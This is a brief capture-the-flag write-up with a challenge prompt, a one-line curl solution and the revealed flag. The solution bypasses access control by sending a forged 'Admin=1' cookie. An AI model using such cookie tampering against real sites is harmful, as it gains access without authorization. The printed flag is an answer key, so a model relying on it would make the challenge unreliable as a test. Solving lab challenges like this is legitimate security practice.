#### Challenge:

Agent, before you go on the another mission, read this file from our archive: Second part is here, but it's encrypted: http://challenges.thecatch.cz/Scandal_2.php Good luck, Agent

---

#### Solution:

```bash
curl 'http://challenges.thecatch.cz/Scandal_2.php' -H 'Cookie: Admin=1' 2>/dev/null | grep "CT18"
```

---

<details><summary>FLAG:</summary>

```
CT18-22xm-uJPb-SFyO-zOkp
```

</details>
